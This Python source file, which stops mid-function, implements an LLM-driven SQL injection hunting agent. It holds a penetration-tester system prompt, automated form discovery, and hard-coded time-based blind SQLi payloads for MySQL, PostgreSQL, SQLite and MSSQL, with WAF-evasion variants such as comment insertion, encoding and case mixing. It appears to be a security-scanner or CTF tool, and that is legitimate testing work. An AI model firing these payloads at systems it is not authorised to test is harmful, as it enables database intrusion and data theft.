#!/usr/bin/env python3
import logging
import asyncio
import re
import json
import time
from typing import Dict, Any, Tuple, Optional, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from src.core.agents.swarm.thought_loop import ThoughtLoop, ThoughtStep
from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence
from src.core.models.llm import LLMClient
from src.core.infra.network_client import AsyncNetworkClient
from src.core.infra.smart_request import SmartRequest
from src.core.utils.oob_listener import get_oob_listener

logger = logging.getLogger(__name__)

async def _fetch_and_parse_form(url: str, auth_headers: Dict[str, str]) -> List[Dict[str, Any]]:
    """
    HTML を取得して BeautifulSoup でフォームを解析（高速・第一選択）
    
    Args:
        url: 対象 URL
        auth_headers: 認証ヘッダー
        
    Returns:
        フォーム情報のリスト
    """
    from bs4 import BeautifulSoup

    forms = []
    try:
        client = AsyncNetworkClient()
        resp = await client.request("GET", url, headers=auth_headers)
        # resp は辞書：{"status": 200, "body": "...", "headers": {...}}
        body = resp.get("body", "") if isinstance(resp, dict) else getattr(resp, "text", "")
        soup = BeautifulSoup(body, "html.parser")
        
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            
            inputs = []
            for input_elem in form.find_all(["input", "select", "textarea"]):
                name = input_elem.get("name")
                if name:
                    input_type = input_elem.get("type", "text")
                    value = input_elem.get("value", "1")
                    inputs.append({"name": name, "type": input_type, "value": value})
            
            forms.append({
                "action": action,
                "method": method,
                "inputs": inputs
            })
        
        await client.close()
    except Exception as e:
        logger.debug(f"[SmartSQLiHunter] HTML form parsing failed for {url}: {e}")
    
    return forms

class SmartSQLiHunter(Specialist, ThoughtLoop):
    """
    Stateful Loop-based Agent for SQL Injection (The Brain).

    Strategies:
    1. Probe: Check parameter reflections and error messages.
    2. Hypothesize: Determine DB type (MySQL, Postgres, etc.) and error type.
    3. Exploit: Craft payloads (UNION, Error-based, Time-based) based on hypothesis.
    4. Verify: Confirm vulnerability.

    MEDIUM/HIGH SECURITY AWARENESS:
    - If input characters like ' or \" are filtered, use numeric injections (e.g., id=1 OR 1=1).
    - If the target is a POST form with dropdowns/radio buttons, manipulate the raw POST values.
    - Test for blind SQLi using conditional timing (SLEEP/BENCHMARK) if no errors are visible.
    """

    name = "SmartSQLiHunter"
    description = "Stateful reasoning agent for deep SQLi detection."
    MAX_PARAMS_TO_TEST = 5
    EXCLUDED_PARAM_NAMES = {"scan_profile", "profile", "_auth", "method"}
    NON_ATTACK_PARAM_NAMES = {"submit", "change", "token", "csrf", "csrf_token", "user_token"}
    CRITICAL_PARAM_HINTS = {
        "id", "user_id", "uid", "account_id", "order_id", "product_id", "item_id", "username"
    }

    @classmethod
    def _is_excluded_param(cls, name: str) -> bool:
        return str(name or "").strip().lower() in cls.EXCLUDED_PARAM_NAMES

    @classmethod
    def _is_non_attack_param(cls, name: str) -> bool:
        return str(name or "").strip().lower() in cls.NON_ATTACK_PARAM_NAMES

    SYSTEM_PROMPT = """You are an expert SQL Injection Penetration Tester.
You must work in a thought loop to detect SQL injection vulnerabilities.

Commands:
- ACTION: request
  INPUT: [The payload]

- ACTION: finish
  INPUT: [vulnerable|safe|unknown]

CRITICAL FORMAT RULES (VIOLATION = IMMEDIATE RETRY):
1. You MUST use EXACTLY this format for EVERY turn:
   THOUGHT: [Your reasoning]
   ACTION: [request|finish]
   INPUT: [payload or vulnerable/safe/unknown]

2. NEVER write "Observation:" or "observation" - this is PROVIDED BY THE TOOL after your Action.
3. NEVER write "Final Answer:" or "Conclusion:" - use "ACTION: finish" instead.
4. NEVER fabricate tool outputs or observations.
5. If you write invalid format, the system will FORCE RETRY.

Guidelines:
1. If basic quotes (' or ") are escaped (e.g. Medium level security), try numeric payloads that don't require quotes (e.g. 1 OR 1=1).
2. For dropdowns or numeric IDs, test for Boolean-based differences using arithmetic or conditional logic (e.g. id=1+0 vs id=1+1).
3. If a WAF is suspected, use encoding (URL, hex, unicode) or whitespace manipulation (e.g. /**/, %0a).
4. Use standard SQL error messages to identify the database type (MySQL, PostgreSQL, etc.).
5. Test for time-based blind SQLi if no immediate differences are found (e.g. ' OR SLEEP(5)--).
6. Support for POST forms and JSON bodies is available. If methodology involves POST, payloads will be placed in the body.

VULNERABILITY DETECTION CRITERIA:
- If you see SQL error messages (e.g., "SQL syntax", "MariaDB", "MySQL", "ORA-", "PostgreSQL"), the target IS VULNERABLE.
- If you see "Fatal error" or "mysqli_sql_exception" in the response, the target IS VULNERABLE.
- When you confirm vulnerability, immediately use "ACTION: finish" with INPUT: "vulnerable" and include evidence in your THOUGHT.

Refinement:
Always analyze the 'Observation' which contains status, diff, and a snippet of the response body.
If you see SQL error messages, focus on error-based exploitation.
If the response length or status changes slightly, focus on boolean-based blind exploitation.

Format:
THOUGHT: [Reasoning about the next payload strategy based on previous observations]
ACTION: [Command]
INPUT: [Input]
"""

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        Specialist.__init__(self, config)
        ThoughtLoop.__init__(self, max_turns=8)

        mode = "ctf"  # CTF モードで POST リクエストを許可
        from src.config import settings
        model = getattr(settings, "model", None) or getattr(settings, "model_output", "deepseek/deepseek-chat")
        if config and isinstance(config, dict):
             mode = config.get("mode", mode)
             model = config.get("model", model) if isinstance(config, dict) else getattr(config, "model", model)

        self.llm = LLMClient(model=model, use_local=False)

        # Network Setup
        proxy_manager = None
        try:
            from src.core.infra.proxy_manager import get_proxy_manager
            proxy_manager = get_proxy_manager()
        except ImportError:
            pass

        from src.core.security.request_guard import get_request_guard

        base_client = AsyncNetworkClient(proxy_manager=proxy_manager, mode=mode)
        self.smart_client = SmartRequest(base_client, request_guard=get_request_guard(mode=mode))

        # State for loop
        self.vulnerable = False
        self.evidence = ""
        self.used_payloads = []
        self.history_messages = []
        self.last_tested_params: List[str] = []
        self.last_blind_correlation: Dict[str, Any] = {}
        self._max_observed_latency = 0.0
        self._time_signal_payload = ""
        self._time_signal_latency = 0.0
        self._consecutive_blocked_observations = 0
        self._no_signal_turns = 0

    def _compute_adaptive_turn_budget(
        self,
        quick_mode: bool,
        candidate_count: int,
        param_name: str,
        target_url: str = "",
    ) -> int:
        base = 4 if quick_mode else 6
        normalized_param = str(param_name or "").strip().lower()
        if normalized_param in self.CRITICAL_PARAM_HINTS:
            base += 2
        target_lower = str(target_url or "").lower()
        if "sqli_blind" in target_lower and base < 7:
            base += 1
        if candidate_count >= 4:
            base -= 1
        return max(4, min(8, base))

    async def close(self):
        """リソース解放"""
        if self.smart_client and hasattr(self.smart_client, "client"):
            await self.smart_client.client.close()

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        """
        Specialist としてのエントリーポイント
        
        Args:
            task: タスク情報
            quick_mode: True の場合、ThoughtLoop のターン数を制限して高速化
        """
        logger.info(f"[{self.name}] Starting ThoughtLoop for {task.target} (quick_mode={quick_mode})")

        # quick_mode の場合はターン数を絞る（run_as_tool 側でパラメータ別に適応補正）
        original_max_turns = self.max_turns
        if quick_mode:
            self.max_turns = 4

        # run_as_tool 内でパラメータ数に応じた turn budget を算出するため保持
        self.context["quick_mode"] = quick_mode

        # タイムアウト制御付きで実行（Layer 2 リトライを考慮して延長）
        # quick_mode: 120 秒→300 秒、通常：240 秒→600 秒
        timeout = 300 if quick_mode else 600
        try:
            result = await asyncio.wait_for(
                self.run_as_tool(task.target, task.params),
                timeout=timeout
            )
        except asyncio.TimeoutError:
            logger.warning(f"[{self.name}] Timeout after {timeout}s for {task.target}")
            return []
        finally:
            # max_turns を元に戻す
            self.max_turns = original_max_turns
            self.context.pop("quick_mode", None)

        findings = []
        blind_correlation = result.get("blind_correlation", {}) or {}
        time_based = blind_correlation.get("time_based", {}) if isinstance(blind_correlation, dict) else {}
        blind_time_based_confirmed = bool(time_based.get("confirmed", False))
        target_lower = str(task.target or "").lower()
        forced_blind_detection = (
            not bool(result.get("vulnerable", False))
            and "sqli_blind" in target_lower
            and blind_time_based_confirmed
        )

        if result.get("vulnerable") or forced_blind_detection:
            evidence_text = str(result.get("evidence", "") or "").strip()
            if forced_blind_detection:
                payload = str(time_based.get("payload", "") or "")
                observed_latency = float(time_based.get("observed_latency_seconds", 0.0) or 0.0)
                expected_delay = float(time_based.get("expected_delay_seconds", 0.0) or 0.0)
                evidence_text = (
                    "Time-based blind SQLi signal confirmed "
                    f"(payload='{payload}', observed_latency={observed_latency:.2f}s, "
                    f"expected_delay={expected_delay:.2f}s)."
                )
            finding = Finding(
                vuln_type=VulnType.SQLI,
                severity=Severity.HIGH,
                title=f"SQL Injection in parameter '{result.get('param', 'unknown')}'",
                description=(
                    "Time-based blind SQL Injection confirmed."
                    if forced_blind_detection
                    else result.get("description", "Detected by SmartSQLiHunter.")
                ),
                target_url=task.target,
                evidence=Evidence(
                    request_url=task.target,
                    response_body=evidence_text
                ),
                source_agent=self.name,
                confidence=0.9,
                tags=["sqli", "smart_agent"],
                additional_info={
                    "parameter": result.get("param"),
                    "payload": (result.get("payloads_used") or [""])[-1],
                    "payloads_used": result.get("payloads_used", []) or [],
                    "tested_params": result.get("tested_params", []),
                    "blind_correlation": blind_correlation,
                    "blind_time_based_confirmed": blind_time_based_confirmed,
                }
            )
            findings.append(finding)

        return findings

    async def run_as_tool(self, url: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Manager から呼び出し可能な Tool メソッド。
        フォーム情報が含まれる場合、POST パラメータとして抽出する。
        """
        params = params or {}
        _auth = params.get("_auth", {})
        auth_headers = _auth.get("auth_headers", {})
        cookies_str = _auth.get("cookies", "")
        if cookies_str and "Cookie" not in auth_headers:
            auth_headers["Cookie"] = cookies_str

        method = params.get("method", "GET").upper()
        target = url

        META_KEYS = {
            "_auth",
            "target", "url", "vuln_type", "manager_timeout_seconds",
            "per_url_timeout_seconds", "phase1_timeout_retries", "manager_phase1_early_return",
            "targets", "targets_file", "source_file", "cookies",
            "tags", "category", "_context", "extra_targets",
            "auth_headers", "headers", "count", "forms", "scan_profile", "profile",
        }
        payload_params = {k: v for k, v in params.items() if k not in META_KEYS}

        parsed = urlparse(target)
        url_params = parse_qs(parsed.query)
        url_params_flat = {k: v[0] if v else "" for k, v in url_params.items()}

        # フォーム情報を事前に初期化（スコープ問題回避）
        forms = params.get("forms", [])
        
        if not payload_params:
            # フォーム情報が提供されている場合、それを優先
            if forms:
                for form in forms:
                    form_method = form.get("method", "GET").upper()
                    if form_method == "POST":
                        method = "POST"
                    for input_field in form.get("inputs", []):
                        param_name = input_field.get("name", "")
                        if param_name and not self._is_excluded_param(param_name):
                            # 初期値を設定（SQLi テスト用）
                            payload_params[param_name] = input_field.get("value", "1")
                logger.info("[%s] Extracted %d params from provided forms: %s",
                           self.name, len(payload_params), list(payload_params.keys()))

        # フォーム情報が提供されていない、または追加のフォームパラメータがある場合、HTML パースでフォームを検出（常に実行）
        forms_from_html = await _fetch_and_parse_form(target, auth_headers)
        if forms_from_html:
            for form in forms_from_html:
                form_method = form.get("method", "GET").upper()
                if form_method == "POST":
                    method = "POST"
                for input_field in form.get("inputs", []):
                    param_name = input_field.get("name", "")
                    # 既存のパラメータを上書きしない（LLM の推測を優先）
                    if (
                        param_name
                        and not self._is_excluded_param(param_name)
                        and param_name not in payload_params
                    ):
                        payload_params[param_name] = input_field.get("value", "1")
            if forms_from_html:
                logger.info("[%s] Extracted %d additional params from HTML forms: %s",
                           self.name, len(payload_params), list(payload_params.keys()))
        
        forms = forms or forms_from_html  # forms 変数を更新

        # HTML パースでもフォームがない場合、URL クエリから取得
        if not payload_params and url_params_flat:
            payload_params = {
                key: value
                for key, value in url_params_flat.items()
                if not self._is_excluded_param(key)
            }

        # 全てダメな場合、Playwright でフォームを検出（最終フォールバック）
        if not payload_params:
            try:
                from src.tools.browser.playwright_validator import PlaywrightValidator
                pw_forms = await PlaywrightValidator().extract_forms(
                    target,
                    timeout=10.0,
                    cookies=[{"name": c.split("=")[0].strip(), "value": c.split("=")[1].strip(), "domain": urlparse(target).hostname}] if cookies_str else None
                )
                if pw_forms:
                    for form in pw_forms:
                        if form.get("method", "get").upper() == "POST":
                            method = "POST"
                        for input_field in form.get("inputs", []):
                            param_name = input_field.get("name", "")
                            if param_name and not self._is_excluded_param(param_name):
                                payload_params[param_name] = "1"
                    logger.info("[%s] Extracted %d params from Playwright forms: %s",
                               self.name, len(payload_params), list(payload_params.keys()))
            except Exception as e:
                logger.debug("[%s] Playwright form extraction failed: %s", self.name, e)

        # forms 変数を常に初期化
        if 'forms' not in locals():
            forms = []

        candidate_params = [
            name for name in list(payload_params.keys())
            if not self._is_excluded_param(name) and not self._is_non_attack_param(name)
        ][:self.MAX_PARAMS_TO_TEST] if payload_params else []
        quick_mode_flag = bool(self.context.get("quick_mode", False))
        tested_params: List[str] = []
        self.last_tested_params = tested_params
        self.last_blind_correlation = {}
        self._max_observed_latency = 0.0
        self._time_signal_payload = ""
        self._time_signal_latency = 0.0
        self._consecutive_blocked_observations = 0
        self._no_signal_turns = 0
        loop_result: Dict[str, Any] = {"status": "not_run", "reason": "no_parameters"}

        for param_name in candidate_params:
            tested_params.append(param_name)
            original_param_max_turns = self.max_turns
            self.max_turns = self._compute_adaptive_turn_budget(
                quick_mode_flag,
                len(candidate_params),
                param_name,
                target,
            )
            logger.debug(
                "[%s] Adaptive turn budget for param '%s': %d (candidates=%d)",
                self.name,
                param_name,
                self.max_turns,
                len(candidate_params),
            )

            # ThoughtLoop コンテキスト設定
            self.context = {
                "target": target,
                "param": param_name,
                "method": method,
                "params": payload_params,
                "auth_headers": auth_headers,
                "cookies": cookies_str,
                "forms": forms if forms else [],
            }

            # State 初期化
            self.vulnerable = False
            self.evidence = ""
            self.used_payloads = []
            self.history_messages = []
            if "sqli_blind" in target.lower():
                precheck = await self._run_time_based_blind_precheck(
                    param_name=param_name,
                    baseline_value=payload_params.get(param_name, "1"),
                )
                if precheck.get("confirmed"):
                    self.vulnerable = True
                    self.evidence = (
                        "Time-based blind SQLi signal confirmed "
                        f"(payload='{precheck.get('payload', '')}', "
                        f"baseline={precheck.get('baseline_latency_seconds', 0.0):.2f}s, "
                        f"observed={precheck.get('observed_latency_seconds', 0.0):.2f}s)."
                    )
                    loop_result = {
                        "status": "blind_precheck_confirmed",
                        "param": param_name,
                        **precheck,
                    }
                    self.max_turns = original_param_max_turns
                    break
            self.history_messages.append({"role": "system", "content": self.SYSTEM_PROMPT})

            initial_prompt = f"""Target URL: {target}
Method: {method}
Parameter: {param_name}
Original Value: {payload_params.get(param_name, '') if payload_params else ''}

Start your SQL injection testing.
"""
            self.history_messages.append({"role": "user", "content": initial_prompt})

            # ThoughtLoop を実行（親クラスの run_loop を使用）
            try:
                loop_result = await self.run_loop(self.context)
            except Exception as e:
                logger.error(f"[{self.name}] ThoughtLoop failed for param {param_name}: {e}")
                loop_result = {"status": "failed", "error": str(e), "param": param_name}
            finally:
                self.max_turns = original_param_max_turns

            if self.vulnerable:
                break

        blind_correlation = self._build_blind_correlation(self.used_payloads)
        self.last_blind_correlation = blind_correlation

        return {
            "vulnerable": self.vulnerable,
            "evidence": self.evidence,
            "param": self.context.get("param"),
            "tested_params": tested_params,
            "payloads_used": self.used_payloads,
            "description": f"SQL Injection detected." if self.vulnerable else "No SQL Injection detected.",
            "loop_result": loop_result,
            "blind_correlation": blind_correlation,
        }

    async def decide(self, turn: int) -> Tuple[str, str, Any]:
        """
        LLM decides the next move (ThoughtLoop abstract method).
        
        LLM の出力を検証し、不正な形式（Observation の自己生成など）を検出したらリトライ。
        """
        history_text = "\n".join([
            f"Turn {s.turn}: Act={s.action}({s.action_input}) -> {s.observation}"
            for s in self.history
        ])

        prompt = f"""Target: {self.context['target']}
Testing Parameter: {self.context['param']}
Method: {self.context['method']}
Current Turn: {turn}

History:
{history_text if history_text else 'No previous actions'}

Decide next step for SQL injection testing.
"""
        response = await self.llm.agenerate([
            {"role": "system", "content": self.SYSTEM_PROMPT},
            {"role": "user", "content": prompt}
        ])

        content = response.choices[0].message.content if response and response.choices else ""

        # フォールバック
        if not content:
            logger.warning(f"Turn {turn}: LLM returned empty content. Forcing finish.")
            return "Analysis complete (LLM empty)", "finish", "safe"

        # Layer 2: LLM 出力の厳密な検証
        # Observation を含んでいたらエラー（再試行）
        if "Observation:" in content or "observation" in content.lower():
            logger.warning(f"Turn {turn}: LLM wrote 'Observation:'! This is invalid. Forcing retry...")
            # 履歴にエラーメッセージを追加して再試行
            self.history.append({
                "role": "user",
                "content": "ERROR: You wrote 'Observation:' in your output. This is INVALID. "
                          "Do NOT write 'Observation:' yourself. Observation is PROVIDED BY THE TOOL after your Action. "
                          "Your output should ONLY contain THOUGHT, ACTION, and INPUT. Please retry."
            })
            # 再帰的に呼び出してリトライ（最大 3 回まで）
            if turn < self.max_turns:
                return await self.decide(turn)
            else:
                return "Analysis complete (LLM wrote invalid Observation)", "finish", "safe"

        # Final Answer など、不正な形式も検出
        if "Final Answer:" in content or "final answer" in content.lower():
            logger.warning(f"Turn {turn}: LLM wrote 'Final Answer:'! This should be 'ACTION: finish'. Forcing retry...")
            self.history.append({
                "role": "user",
                "content": "ERROR: You wrote 'Final Answer:' in your output. This is INVALID. "
                          "Use 'ACTION: finish' instead of 'Final Answer:'. Please retry."
            })
            if turn < self.max_turns:
                return await self.decide(turn)
            else:
                return "Analysis complete (LLM wrote invalid format)", "finish", "safe"

        # Parse
        thought = "Analyzing..."
        action = "finish"
        action_input = "safe"

        thought_match = re.search(r'THOUGHT:\s*(.+?)(?=\nACTION:|$)', content, re.DOTALL | re.IGNORECASE)
        action_match = re.search(r'ACTION:\s*([a-zA-Z_]+)', content, re.IGNORECASE)
        input_match = re.search(r'INPUT:\s*(.+)', content, re.IGNORECASE)

        if thought_match:
            thought = thought_match.group(1).strip()
        if action_match:
            action = action_match.group(1).strip().lower()
        if input_match:
            action_input = input_match.group(1).strip()

        return thought, action, action_input

    async def act(self, action: str, action_input: Any) -> str:
        """Execute action (ThoughtLoop abstract method)."""
        # 複数の終了アクション形式を許可
        if action in ["finish", "final", "final_answer", "conclusion"]:
            action_input_lower = str(action_input).lower()
            # 脆弱性検出の複数の表現を許可
            if any(kw in action_input_lower for kw in ["vulnerable", "found", "confirmed", "detected", "success"]):
                self.vulnerable = True
                self.evidence = str(action_input)
            return f"Finished: {action_input}"

        if action == "request":
            payload = str(action_input)
            self.used_payloads.append(payload)

            # リクエスト送信
            obs = await self._send_request(payload)
            diff_type = str(obs.get("diff", "")).lower()
            if diff_type in {"blocked", "error"}:
                self._consecutive_blocked_observations += 1
            else:
                self._consecutive_blocked_observations = 0

            elapsed = float(obs.get("elapsed_seconds", 0.0) or 0.0)
            if elapsed > self._max_observed_latency:
                self._max_observed_latency = elapsed
            if self._looks_like_time_payload(payload):
                threshold = max(3.0, self._estimate_expected_delay(payload) * 0.7)
                if elapsed >= threshold and elapsed > self._time_signal_latency:
                    self._time_signal_payload = payload
                    self._time_signal_latency = elapsed

            if diff_type == "normal" and elapsed < 2.0:
                self._no_signal_turns += 1
            else:
                self._no_signal_turns = 0

            return (
                f"Observation: Status={obs['status']}, Diff={obs['diff']}, "
                f"Latency={elapsed:.2f}s, Body={obs['body_snippet']}"
            )

        return f"Unknown action: {action}"

    async def should_stop(self, step: ThoughtStep) -> bool:
        """Check if we should stop."""
        if self.vulnerable:
            return True

        if self._consecutive_blocked_observations >= 2:
            logger.info(
                "[%s] Early stop on param '%s' due to repeated blocked/error observations.",
                self.name,
                self.context.get("param"),
            )
            return True

        current_param = str(self.context.get("param", "")).strip().lower()
        target_lower = str(self.context.get("target", "")).lower()
        if current_param in self.CRITICAL_PARAM_HINTS:
            no_signal_limit = 5 if "sqli_blind" in target_lower else 4
        else:
            no_signal_limit = 3
        if self._no_signal_turns >= no_signal_limit and self._max_observed_latency < 2.0:
            logger.info(
                "[%s] Early stop on param '%s' due to repeated low-signal normal responses (limit=%d).",
                self.name,
                self.context.get("param"),
                no_signal_limit,
            )
            return True

        if step.action == "finish":
            return True
        return False

    def get_result(self) -> Dict[str, Any]:
        """Override to return SQLi-specific result."""
        return {
            "status": self.status.value,
            "turns": len(self.history),
            "vulnerable": self.vulnerable,
            "evidence": self.evidence,
            "payloads_used": self.used_payloads,
            "blind_correlation": self.last_blind_correlation,
        }

    def _looks_like_time_payload(self, payload: str) -> bool:
        payload_lower = str(payload or "").lower()
        markers = ["sleep(", "sleep ", "pg_sleep", "waitfor delay", "benchmark(", "dbms_lock.sleep"]
        return any(marker in payload_lower for marker in markers)

    def _estimate_expected_delay(self, payload: str) -> float:
        payload_text = str(payload or "")
        patterns = [
            r"sleep\s*\(\s*(\d+)\s*\)",
            r"pg_sleep\s*\(\s*(\d+)\s*\)",
            r"waitfor\s+delay\s+'0:0:(\d+)'",
            r"dbms_lock\.sleep\s*\(\s*(\d+)\s*\)",
        ]
        for pattern in patterns:
            match = re.search(pattern, payload_text, re.IGNORECASE)
            if match:
                try:
                    return max(1.0, float(match.group(1)))
                except (TypeError, ValueError):
                    continue
        return 5.0

    def _extract_oob_tokens(self, text: str) -> List[str]:
        if not text:
            return []
        pattern = re.compile(r"/(?:callback/)?([0-9a-fA-F]{8})(?:\b|/|\?)")
        tokens: List[str] = []
        for token in pattern.findall(str(text)):
            normalized = token.lower()
            if normalized not in tokens:
                tokens.append(normalized)
        return tokens

    def _build_blind_correlation(self, payloads_used: List[str]) -> Dict[str, Any]:
        time_based_confirmed = bool(self._time_signal_payload)
        expected_delay = self._estimate_expected_delay(self._time_signal_payload) if self._time_signal_payload else 0.0
        time_based = {
            "confirmed": time_based_confirmed,
            "payload": self._time_signal_payload,
            "expected_delay_seconds": round(expected_delay, 3) if expected_delay else 0.0,
            "observed_latency_seconds": round(self._time_signal_latency, 3) if self._time_signal_latency else 0.0,
            "max_observed_latency_seconds": round(self._max_observed_latency, 3) if self._max_observed_latency else 0.0,
        }

        oob_tokens: List[str] = []
        for payload in payloads_used or []:
            for token in self._extract_oob_tokens(str(payload)):
                if token not in oob_tokens:
                    oob_tokens.append(token)

        oob_hits: List[Dict[str, Any]] = []
        if oob_tokens:
            listener = get_oob_listener()
            for token in oob_tokens:
                interactions = listener.get_interactions(token)
                if not interactions:
                    continue
                oob_hits.append({
                    "token": token,
                    "count": len(interactions),
                    "paths": [i.path for i in interactions[:3]],
                })

        oob = {
            "tested_tokens": oob_tokens,
            "confirmed": bool(oob_hits),
            "hits": oob_hits,
        }

        return {
            "time_based": time_based,
            "oob": oob,
            "correlated": bool(time_based_confirmed and oob_hits),
        }

    async def _run_time_based_blind_precheck(self, param_name: str, baseline_value: Any) -> Dict[str, Any]:
        """
        Day 2強化: sqli_blind 向けに time-based payload を先行評価
        - DB別ペイロード対応（MySQL, PostgreSQL, SQLite, MSSQL）
        - WAF回避ペイロード対応（コメント挿入、エンコーディング）
        """
        baseline_payload = f"{param_name}={baseline_value}"
        baseline_obs = await self._send_request(baseline_payload)
        baseline_elapsed = float(baseline_obs.get("elapsed_seconds", 0.0) or 0.0)

        # Day 2強化: DB別Time-basedペイロード
        db_specific_payloads = self._generate_time_based_payloads(param_name)

        # Day 2強化: WAF回避ペイロード
        waf_evasion_payloads = self._generate_waf_evasion_payloads(param_name)

        # すべてのペイロードを統合
        all_candidates = db_specific_payloads + waf_evasion_payloads

        # まず基本ペイロードで試行
        for payload in all_candidates:
            obs = await self._send_request(payload)
            elapsed = float(obs.get("elapsed_seconds", 0.0) or 0.0)
            self._max_observed_latency = max(self._max_observed_latency, baseline_elapsed, elapsed)
            if int(obs.get("status", 0) or 0) == 0:
                continue

            latency_delta = elapsed - baseline_elapsed
            # Day 2強化: より厳密な閾値（3秒遅延を期待）
            expected_delay = self._estimate_expected_delay(payload)
            threshold = max(2.5, expected_delay * 0.8)  # 期待遅延の80%以上

            if elapsed >= threshold and latency_delta >= 2.0:
                self._time_signal_payload = payload
                self._time_signal_latency = elapsed
                if payload not in self.used_payloads:
                    self.used_payloads.append(payload)
                return {
                    "confirmed": True,
                    "payload": payload,
                    "baseline_latency_seconds": round(baseline_elapsed, 3),
                    "observed_latency_seconds": round(elapsed, 3),
                    "latency_delta_seconds": round(latency_delta, 3),
                    "expected_delay_seconds": expected_delay,
                    "technique": self._detect_payload_technique(payload),
                }

        return {
            "confirmed": False,
            "payload": "",
            "baseline_latency_seconds": round(baseline_elapsed, 3),
            "observed_latency_seconds": 0.0,
            "latency_delta_seconds": 0.0,
            "expected_delay_seconds": 0.0,
            "technique": None,
        }

    # Day 2強化: DB別Time-basedペイロード生成
    def _generate_time_based_payloads(self, param_name: str) -> List[str]:
        """データベース別のTime-basedペイロードを生成"""
        base_value = "1"
        payloads = []

        # MySQL/MariaDB
        mysql_payloads = [
            f"{param_name}={base_value}' AND SLEEP(3)-- -",
            f"{param_name}={base_value}' AND SLEEP(3)#",
            f"{param_name}={base_value} AND SLEEP(3)",  # 数値型
            f"{param_name}={base_value}' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -",  # サブクエリ形式
            f"{param_name}={base_value}' AND IF(1=1, SLEEP(3), 0)-- -",  # 条件付き
            f"{param_name}={base_value}' AND BENCHMARK(1000000, MD5('test'))-- -",  # CPU負荷型
        ]

        # PostgreSQL
        pgsql_payloads = [
            f"{param_name}={base_value}' AND pg_sleep(3)-- -",
            f"{param_name}={base_value}' AND (SELECT pg_sleep(3))-- -",
            f"{param_name}={base_value} AND pg_sleep(3)",
            f"{param_name}={base_value}' AND CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- -",
        ]

        # SQLite（limited support）
        sqlite_payloads = [
            f"{param_name}={base_value}' AND randomblob(1000000000)-- -",  # CPU負荷型
            f"{param_name}={base_value} AND randomblob(1000000000)",
        ]

        # MSSQL
        mssql_payloads = [
            f"{param_name}={base_value}' WAITFOR DELAY '0:0:3'-- -",
            f"{param_name}={base_value}; WAITFOR DELAY '0:0:3'-- -",
        ]

        payloads.extend(mysql_payloads)
        payloads.extend(pgsql_payloads)
        payloads.extend(sqlite_payloads)
        payloads.extend(mssql_payloads)

        return payloads

    # Day 2強化: WAF回避ペイロード生成
    def _generate_waf_evasion_payloads(self, param_name: str) -> List[str]:
        """WAF回避用の難読化ペイロードを生成"""
        base_value = "1"
        payloads = []

        # コメント挿入
        comment_payloads = [
            f"{param_name}={base_value}'/**/AND/**/SLEEP(3)-- -",
            f"{param_name}={base_value}'/*test*/AND/*test*/SLEEP(3)#",
            f"{param_name}={base_value}' AND /*!50000SLEEP*/(3)-- -",  # MySQLバージョンコメント
        ]

        # エンコーディング変換
        encoded_payloads = [
            f"{param_name}={base_value}'%20AND%20SLEEP(3)-- -",  # URLエンコード
            f"{param_name}={base_value}'+AND+SLEEP(3)-- -",  # +エンコード
        ]

        # 改行/タブ挿入
        whitespace_payloads = [
            f"{param_name}={base_value}'%0aAND%0aSLEEP(3)-- -",  # 改行
            f"{param_name}={base_value}'%09AND%09SLEEP(3)-- -",  # タブ
        ]

        # 大文字小文字混在
        case_payloads = [
            f"{param_name}={base_value}' AND sLeEp(3)-- -",
            f"{param_name}={base_value}' AND SlEeP(3)#",
        ]

        payloads.extend(comment_payloads)
        payloads.extend(encoded_payloads)
        payloads.extend(whitespace_payloads)
        payloads.extend(case_payloads)

        return payloads

    # Day 2強化: ペイロード技術検出
    def _detect_payload_technique(self, payload: str) -> str:
        """使用されたペイロード技術を検出"""
        p = payload.lower()
        if "sleep(" in p or "pg_sleep(" in p:
            return "time_based_sleep"
        elif "benchmark(" in p:
            return "time_based_benchmark"
        elif "randomblob(" in p:
            return "time_based_randomblob"
        elif "waitfor" in p:
            return "time_based_waitfor"
        elif "/**/" in p or "/*!" in p:
            return "waf_evasion_comment"
        elif "%20" in p or "%0a" in p:
            return "waf_evasion_encoding"
        else:
            return "basic"

    async def _send_request(self, payload: str) -> Dict[str, Any]:
        """実際のリクエストを送信し、結果を返す"""
        param = self.context.get("param")
        target = self.context.get("target")
        method = self.context.get("method", "GET")
        auth_headers = self.context.get("auth_headers", {})
        params = self.context.get("params", {}).copy()

        # payload からパラメータ値を抽出
        # LLM は "id=1'" のように返す可能性があるが、param が既に分かっているので値のみを使用
        payload_value = payload
        if '=' in payload and payload.startswith(param + '='):
            # "id=1'" -> "1'" に変換
            payload_value = payload[len(param) + 1:]
            logger.debug(f"[{self.name}] Extracted payload value: '{payload_value}' from '{payload}'")

        if param and param in params:
            params[param] = payload_value

        try:
            start = time.perf_counter()
            if method == "POST":
                resp = await self.smart_client.request(
                    "POST",
                    target,
                    data=params,
                    headers=auth_headers,
                    timeout=60
                )
            else:
                parsed = urlparse(target)
                new_query = urlencode(params)
                new_url = urlunparse(parsed._replace(query=new_query))

                resp = await self.smart_client.request(
                    "GET",
                    new_url,
                    headers=auth_headers,
                    timeout=60
                )

            # SmartRequest のレスポンスは辞書オブジェクト
            # resp = {"status": int, "body": str, "headers": dict, "error": str or None}
            body = resp.get("body", "")[:500] if resp.get("body") else ""
            status = resp.get("status", 0)
            error = resp.get("error")
            elapsed = max(0.0, time.perf_counter() - start)

            # RequestGuard などでブロックされた場合
            if error or status == 0:
                logger.warning(f"[{self.name}] Request blocked or failed: {error}")
                return {
                    "status": status,
                    "diff": "blocked",
                    "body_snippet": f"Blocked: {error}",
                    "elapsed_seconds": elapsed,
                }

            # Day 1強化: DB別エラーパターンマッチング
            db_detection = self._detect_database_type(body)
            error_classification = self._classify_sql_error(body)

            # 従来の基本パターンも維持
            sql_errors = [
                "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
                "ODBC", "JDBC", "unclosed quotation mark", "syntax error",
                "mariadb"
            ]
            basic_diff = "error" if any(err.lower() in body.lower() for err in sql_errors) else "normal"

